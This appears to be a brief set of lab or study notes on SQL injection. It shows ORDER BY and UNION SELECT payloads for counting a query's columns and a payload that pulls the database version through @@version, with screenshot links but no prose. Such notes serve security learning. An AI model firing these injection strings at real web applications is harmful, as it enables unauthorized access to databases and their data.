## Detect number of columns

- Using `ORDER BY`
- Using `UNION`
#### Using ORDER BY

```sql
' order by 1-- -
```
#### Using UNION

```sql
cn' UNION select 1,2,3-- -
```
![](Screenshot%202026-06-17%20at%2018.38.10.png)

```sql
cn' UNION select 1,2,3,4-- -
```
![](Screenshot%202026-06-17%20at%2018.38.21.png)
## Location of Injection

```sql
cn' UNION select 1,@@version,3,4-- -
```
![](Screenshot%202026-06-17%20at%2018.40.08.png)
